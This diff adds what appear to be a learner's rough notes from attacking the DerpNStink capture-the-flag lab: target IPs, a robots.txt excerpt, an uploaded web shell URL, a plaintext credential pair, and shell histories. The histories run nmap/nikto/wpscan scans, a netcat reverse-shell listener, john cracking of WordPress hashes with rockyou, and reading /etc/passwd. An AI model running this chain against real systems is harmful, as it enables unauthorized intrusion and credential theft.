@@ -1,0 +1,101 @@
+192.168.1.162 
+
+192.168.1.231
+
+User-agent: *
+Disallow: /php/
+Disallow: /temporary/
+
+
+
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/passwd
+
+
+
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php
+
+
+ unclestinky:wedgie57      stinky
+
+ admin
+ 
+ 
+ 1
+ 1  ping 8.8.8.8
+    2  ifconfig
+    3  sudo nano /etc/host
+    4  nmap 192.168.1.0/24
+    5  nmap -sCV 192.168.1.0/24
+    6  nmap -sCV 192.168.1.231
+    7  ftp 192.168.1.231
+    8  nikto -h http://192.168.1.231
+    9  curl http://192.168.1.231 /#wp-config.php~
+   10  nmap 192.168.1.0/24
+   11  view http://192.168.1.231
+   12  sudo nano /etc/host
+   13  cat /etc/hosts
+   14  sudo nano /etc/hosts
+   15  wpscan --url http://derpnstink.local/weblog -e
+   16  nano shell.php
+   17  ^[[200~nc -lvnp 4444 
+   18  nc -lvnp 4444 \n
+   19  cd /var/www/html/weblog
+
+2
+ 1  ping 8.8.8.8
+    2  ifconfig
+    3  sudo nano /etc/host
+    4  nmap 192.168.1.0/24
+    5  nmap -sCV 192.168.1.0/24
+    6  nmap -sCV 192.168.1.231
+    7  ftp 192.168.1.231
+    8  nikto -h http://192.168.1.231
+    9  curl http://192.168.1.231 /#wp-config.php~
+   10  nmap 192.168.1.0/24
+   11  view http://192.168.1.231
+   12  ip a
+   13  ftp 192.168.1.231
+
+3  1  ping 8.8.8.8
+    2  ifconfig
+    3  sudo nano /etc/host
+    4  nmap 192.168.1.0/24
+    5  nmap -sCV 192.168.1.0/24
+    6  nmap -sCV 192.168.1.231
+    7  ftp 192.168.1.231
+    8  nikto -h http://192.168.1.231
+    9  curl http://192.168.1.231 /#wp-config.php~
+   10  nmap 192.168.1.0/24
+   11  view http://192.168.1.231
+   12  ip a
+   13  nc -lvnp 4444 
+   14  nano test.hash
+   15  john --wordlists-/usr/share/wordlists/rockyou.txt test.hash
+   16  ls -la
+   17  cat test,hash
+   18  cat test.hash
+   19  john --wordlists-/usr/share/wordlists/rockyou.txt test.hash --format=md5crypt
+   20  john --wordlists=/usr/share/wordlists/rockyou.txt test.hash --format=md5crypt
+   21  find test.hash
+   22  cd test.hash
+   23  realpath test.hash
+   24  john --wordlists=/home/kali  test.hash --format=md5crypt
+   25  john --wordlists=/usr/share/wordlists/rockyou.txt test.hash --format=md5crypt
+   26  john --wordlists=/usr/share/wordlists/rockyou.txt test.hash --format=phpass
+   27  john --wordlist=/usr/share/wordlists/rockyou.txt test.hash --format=phpass
+   28  john --show test.hash
+   29  john --wordlist=/usr/share/wordlists/rockyou.txt test.hash --format=md5crypt
+   30  cat test.hash
+   31  john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass text.hash
+   32  john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass test.hash
+   33  sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+   34  john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass test.hash
+   35  nano test2.hash
+   36  john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass test2.hash
+   37  su stinky
+   38  cat /ets/passwd
+   39  cat/ets/passwd
+   40  cat /etc/passwd
+   41  ftp 192.168.1.231
+
+
